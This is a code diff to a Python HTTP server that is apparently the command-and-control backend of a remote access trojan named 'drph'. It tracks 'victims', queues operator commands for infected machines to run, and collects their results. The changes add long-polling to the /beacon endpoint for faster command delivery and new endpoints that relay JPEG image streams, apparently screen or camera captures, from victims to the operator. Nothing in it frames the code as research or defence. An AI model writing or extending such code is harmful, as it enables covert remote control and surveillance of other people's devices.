@@ -1,18 +1,20 @@
-# language: python, file: server.py, target: py3.8+, render-ready, fixed tokens
-import os, sys, json, time, threading, argparse, logging
+# language: python, file: server.py, target: py3.8+, render-ready
+import os, sys, json, secrets, time, threading, argparse, logging
 import http.server, urllib.parse
 
 logging.basicConfig(stream=sys.stdout, level=logging.INFO,
                     format="%(asctime)s %(levelname)s %(message)s", force=True)
 LOG = logging.getLogger("drph")
 
-VERSION = "6.2"
-TOKEN = "drph"          # victim-facing — baked into APK / payload
-ADMIN = "drph"          # console-facing — pasted into console.py
+VERSION = "6.4"
+TOKEN = "drph"
+ADMIN = "drph"
 
 VICTIMS = {}
 QUEUES  = {}
 RESULTS = {}
+CONDITIONS = {}
+STREAMS = {}  # vid -> jpeg bytes
 LOCK = threading.Lock()
 
 def _json(h, obj, code=200):
@@ -79,6 +81,24 @@ class H(http.server.BaseHTTPRequestHandler):
                 time.sleep(0.1)
             return _json(self, {"ok": False, "err":"timeout"}, 504)
 
+        if p == "/stream_pull":
+            vid = q.get("vid")
+            if not vid: return _json(self, {"err":"vid"}, 400)
+            with LOCK:
+                data = STREAMS.get(vid)
+            if data:
+                self.send_response(200)
+                self.send_header("Content-Type", "image/jpeg")
+                self.send_header("Content-Length", str(len(data)))
+                self.send_header("Access-Control-Allow-Origin", "*")
+                self.end_headers()
+                try: self.wfile.write(data)
+                except Exception: pass
+            else:
+                self.send_response(204)
+                self.end_headers()
+            return
+
         return _json(self, {"err":"not found"}, 404)
 
     def do_POST(self):
@@ -98,17 +118,29 @@ class H(http.server.BaseHTTPRequestHandler):
         if p == "/beacon":
             if not self._is_victim(): return _json(self, {"err":"auth"}, 403)
             b = self._body(); vid = b.get("vid") or "?"
+            
             with LOCK:
+                if vid not in CONDITIONS:
+                    CONDITIONS[vid] = threading.Condition(LOCK)
+            
+            cond = CONDITIONS[vid]
+            deadline = time.time() + 20
+            
+            with cond:
                 v = VICTIMS.setdefault(vid, {})
                 for k in ("hostname","user","os","machine","python","cwd","port","url"):
                     if b.get(k) is not None: v[k] = b[k]
                 v["last_seen"] = time.time()
                 v.setdefault("ip", self.client_address[0])
                 q = QUEUES.setdefault(vid, [])
+                
+                while not q and time.time() < deadline:
+                    cond.wait(timeout=1.0)
+                    
                 if q:
                     item = q.pop(0)
                     return _json(self, {"op":"cmd", "id":item["id"], "cmd":item["cmd"]})
-            return _json(self, {"op":"wait", "sec": 3})
+            return _json(self, {"op":"wait", "sec": 1})
 
         if p == "/result":
             if not self._is_victim(): return _json(self, {"err":"auth"}, 403)
@@ -124,11 +156,20 @@ class H(http.server.BaseHTTPRequestHandler):
             if not self._is_admin(): return _json(self, {"err":"auth"}, 403)
             b = self._body(); vid, cmd = b.get("vid"), b.get("cmd")
             if not vid or not cmd: return _json(self, {"err":"vid+cmd"}, 400)
-            import secrets as _s
-            cid = _s.token_hex(6)
+            cid = secrets.token_hex(6)
             with LOCK:
                 QUEUES.setdefault(vid, []).append({"id": cid, "cmd": cmd})
+                if vid in CONDITIONS:
+                    CONDITIONS[vid].notify_all()
             return _json(self, {"ok": True, "id": cid})
+
+        if p == "/stream_push":
+            if not self._is_victim(): return _json(self, {"err":"auth"}, 403)
+            vid = self.headers.get("X-DRPH-Vid", "?")
+            n = int(self.headers.get("Content-Length", "0"))
+            data = self.rfile.read(n)
+            with LOCK: STREAMS[vid] = data
+            return _json(self, {"ok": True})
 
         return _json(self, {"err":"not found"}, 404)
 
